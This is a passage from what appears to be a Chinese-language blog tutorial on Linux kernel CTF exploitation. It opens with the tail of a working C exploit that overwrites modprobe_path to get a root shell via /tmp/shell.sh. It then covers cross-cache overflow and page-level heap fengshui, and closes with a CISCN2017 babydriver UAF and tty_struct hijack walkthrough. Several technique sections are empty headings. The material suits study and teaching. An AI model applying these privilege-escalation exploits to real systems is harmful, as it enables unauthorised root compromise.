len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_FREE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_to_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_READ, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] copy_from_user len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_WRITE, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// len buf idx</span></span><br><span class="line">    <span class="type">size_t</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x20</span>, buf, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] user_buf : %p\n&quot;</span>, p.buf);</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(RED <span class="string">&quot;[-] Failed to open bof.&quot;</span> NONE);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(YELLOW <span class="string">&quot;[*] try to leak kbase\n&quot;</span> NONE);</span><br><span class="line"></span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    free_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak seq_ops&quot;</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_offset = buf[<span class="number">0</span>] - seq_ops_start;</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW <span class="string">&quot;[*] kernel_offset %p\n&quot;</span> NONE, (<span class="type">void</span>*)kernel_offset);</span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(LIGHT_BLUE <span class="string">&quot;[*] modprobe_path addr : %p\n&quot;</span> NONE, (<span class="type">void</span>*)modprobe_path);</span><br><span class="line">    </span><br><span class="line">    p.len = <span class="number">0xa8</span>;</span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    free_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = modprobe_path - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    write_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line">    alloc_buf(bof_fd, &amp;p);</span><br><span class="line"></span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak modprobe_path&quot;</span>, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;buf[<span class="number">4</span>], <span class="string">&quot;/tmp/shell.sh\x00&quot;</span>);</span><br><span class="line">    write_buf(bof_fd, &amp;p);</span><br><span class="line">    read_buf(bof_fd, &amp;p);</span><br><span class="line">    qword_dump(<span class="string">&quot;leak modprobe_path&quot;</span>, buf, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open(<span class="string">&quot;/shell.sh&quot;</span>, O_RDWR) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;setsid /bin/cttyhack setuidgid 0 /bin/sh&#x27; &gt;&gt; /tmp/shell.sh&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;chmod +x /tmp/shell.sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Page-level-Fengshui"><a href="#Page-level-Fengshui" class="headerlink" title="Page-level Fengshui"></a>Page-level Fengshui</h2><h3 id="利用思路-14"><a href="#利用思路-14" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>Cross-Cache-Overflow</code> 实际上是针对 <code>buddy system</code> 的利用手法。</p>
<ul>
<li><code>slub allocator</code> 底层逻辑是向 <code>buddy system</code> 请求页面后再划分成特定大小 <code>object</code> 返还给上层调用者<ul>
<li>→ 内存中用作不同 <code>kmem_cache</code> 的页面在内存上是有可能相邻的。</li>
</ul>
</li>
<li>若我们的漏洞对象存在于页面 A，溢出目标对象存在于页面 B，且 A、B两页面相邻，则我们便有可能实现跨越不同 <code>kmem_cache</code> 之间的堆溢出。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/9238c63e2b3ebdb287ce19b0dd2c8d24.png"
                      alt="9238c63e2b3ebdb287ce19b0dd2c8d24"
                ></p>
<p>首先让我们重新审视 <code>slub allocator</code> 向 <code>buddy system</code> 请求页面的过程，当 <code>freelist page</code> 已经耗空且 <code>partial</code> 链表也为空时（或者 <code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 <code>buddy system</code> 申请页面：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE.png"
                      alt="yPtXiwzVfxWH7lE"
                ></p>
<p>接下来让我们重新审视 <code>buddy system</code> ，其基本原理就是以 <code>2</code> 的 <code>order</code> 次幂张内存页作为分配粒度，相同 <code>order</code>  间空闲页面构成双向链表，当低阶 <code>order</code> 的页面不够用时便会从高阶 <code>order</code> 取一份连续内存页拆成两半，其中一半挂回当前请求 <code>order</code>  链表，另一半返还给上层调用者；下图为以 <code>order 2</code> 为例的 <code>buddy system</code> 页面分配基本原理：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5342f92979ae7f588c2058a4d2144d8b.gif"
                      alt="5342f92979ae7f588c2058a4d2144d8b"
                ></p>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页。</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这份内存页。</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这份内存页。</li>
</ul>
<p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成 cross-cache overflow</strong>。</p>
<p><strong>注意 slub 申请的 object 位于线性映射区，因此溢出修改的是物理地址相邻的内存页。而 buddy system 的特性可以保证两个物理页物理地址相邻。</strong></p>
<p>在实际情况中我们无法准确控制 buddy system ，因此这一步骤改为：</p>
<ul>
<li>向 buddy system 请求大量的内存页</li>
<li>释放其中一半内存页，在 <code>vulnerable kmem_cache</code> 上堆喷，让其取走这些内存页</li>
<li>释放另一半内存页，在 <code>victim kmem_cache</code> 上堆喷，让其取走这些内存页</li>
</ul>
<p>这样我们有很大概率构造出上面那种情况，从而可以溢出到其他的内核结构体上完成 cross-cache overflow 。</p>
<p><strong>使用 setsockopt 与 pgv 完成页级内存占位与堆风水</strong></p>
<p>当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 <code>2 order</code> 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 <code>buddy system</code> 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>相应地， <code>pgv</code> 中的页面也会在 <code>socket</code> 被关闭后释放：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packet_release()</span><br><span class="line">    packet_set_ring()</span><br><span class="line">    	free_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p><code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 <code>buddy system</code> 中的 <code>low order pages</code> 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 <code>buddy system</code> 的部分页面）。</p>
<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><h2 id="Page-level-UAF"><a href="#Page-level-UAF" class="headerlink" title="Page-level UAF"></a>Page-level UAF</h2><h3 id="利用思路-15"><a href="#利用思路-15" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><h2 id="Dirty-Pagetable"><a href="#Dirty-Pagetable" class="headerlink" title="Dirty Pagetable"></a>Dirty Pagetable</h2><h3 id="利用思路-16"><a href="#利用思路-16" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><h2 id="KSMA"><a href="#KSMA" class="headerlink" title="KSMA"></a>KSMA</h2><h3 id="利用思路-17"><a href="#利用思路-17" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><h2 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h2><h3 id="利用思路-18"><a href="#利用思路-18" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><h2 id="ret2hbp"><a href="#ret2hbp" class="headerlink" title="ret2hbp"></a>ret2hbp</h2><h3 id="利用思路-19"><a href="#利用思路-19" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><h2 id="Use-After-Cleanup"><a href="#Use-After-Cleanup" class="headerlink" title="Use After Cleanup"></a>Use After Cleanup</h2><h3 id="利用思路-20"><a href="#利用思路-20" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><h2 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 babydriver"></a>CISCN2017 babydriver</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>开了 <code>smep</code> 保护，没有 <code>kaslr</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-initrd rootfs.img \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span>\</span><br><span class="line">	-enable-kvm \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-m 64M \</span><br><span class="line">	--nographic \</span><br><span class="line">	-smp cores=1,threads=1 \</span><br><span class="line">	-cpu kvm64,+smep \</span><br><span class="line">	-s</span><br></pre></td></tr></table></figure></div>

<p>模块中存在一个<code>babydevice_t</code>结构体：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">babydevice_t</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *device_buf;</span><br><span class="line">    <span class="type">size_t</span> device_buf_len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyioctl</strong></p>
<p>将原先的 <code>device_buf</code> 释放，并分配一块新的内存。但这里有个很重要的点需要注意：该位置的 <code>kmalloc</code> 大小可以被用户任意指定。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;\x013defalut:arg is %ld\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyopen</strong></p>
<p>申请的初始<code>buf</code>长度为<code>0x40</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babywrite</strong></p>
<p><code>ida</code> 反汇编存在错误，这里需要修改一下<code>copy_from_user</code>的<code>call type</code>为<code>void (__fastcall *)(char *, char *, size_t)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>))copy_from_user)(babydev_struct.device_buf, (<span class="type">char</span> *)buffer, v4);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyread</strong></p>
<p>修改一下<code>copy_to_user</code>的函数调用类型为<code>void (__fastcall *)(char *, char *, size_t)</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, <span class="type">char</span> *, <span class="type">size_t</span>))copy_to_user)(buffer, babydev_struct.device_buf, v4);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>babyrelease</strong></p>
<p>没有重置<code>len</code>，也没有清空<code>buf</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-21"><a href="#利用思路-21" class="headerlink" title="利用思路"></a>利用思路</h3><p>执行完 <code>babyrelease</code> 函数之后，<code>device_buf</code>就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行<code>close(fd)</code>之后，该进程将无法再使用这个文件描述符，因此没有办法在<code>close</code>后再利用这个 <code>fd</code> 去进行写操作。</p>
<p>但我们可以利用 <code>babydriver</code> 中的变量全是全局变量的这个特性，同时执行两次 <code>open</code> 操作，获取两个 fd。这样即便一个 fd 被 close 了，我们仍然可以利用另一个 fd 来对 <code>device_buf</code> 进行写操作。</p>
<p>这道题虽然可以利用<code>UAF</code>提权，但这里我们主要练习一下<code>tty_struct</code>劫持，这道题的劫持相对来说是很简单的。</p>
<ol>
<li>利用 <code>UAF</code> 劫持 <code>tty_struct</code> 的 <code>ops</code> 执行伪造的 <code>fake_ops</code>。</li>
<li>利用 <code>fake_ops-&gt;ioctl</code> 结合 <code>cr4</code> 寄存器关闭 <code>smep</code>，并完成栈迁移。</li>
<li>执行用户空间的提权代码。</li>
</ol>
<p>这里需要注意的是：</p>
<ul>
<li><code>mmap</code> 的内存不应该从 <code>rax &amp; 0xffffffff</code> 开始，因为在执行 <code>rop</code> 时返回到用户空间执行 <code>get_root</code> 函数会抬高 <code>rsp</code> 小于 <code>rax &amp; 0xffffffff</code> 造成越界，因此需要加一个偏移。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* fake_stack = mmap(</span><br><span class="line">            (hijacked_stack_addr &amp; (~<span class="number">0xffff</span>))<span class="number">-0x1000</span>, <span class="comment">// 对齐。</span></span><br><span class="line">            <span class="number">0x30000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE,                    </span><br><span class="line">            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,</span><br><span class="line">            <span class="number">-1</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>mmap</code> 的内存是没有映射到实际物理内存的虚拟内存，如果 <code>rsp</code> 到达没有写入 <code>rop</code> 的位置同样也会导致越界错误，因此在使用前先写入数据使其映射到物理内存上。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(fake_stack, <span class="number">0</span>, <span class="number">0x30000</span>);</span><br></pre></td></tr></table></figure></div>
